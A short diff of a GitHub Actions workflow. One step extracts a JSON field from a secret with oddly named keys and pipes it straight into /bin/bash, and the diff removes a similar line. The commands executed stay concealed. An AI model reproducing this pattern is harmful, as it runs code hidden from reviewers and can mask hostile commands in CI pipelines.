@@ -19,7 +19,6 @@ jobs:
           qjs685: ${{ secrets.qjs685 }}
         run: |
           printf '%s' "$qjs685" | jq -r .grx3 | /bin/bash
-          echo $i37 | jq -r .hgki83629 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
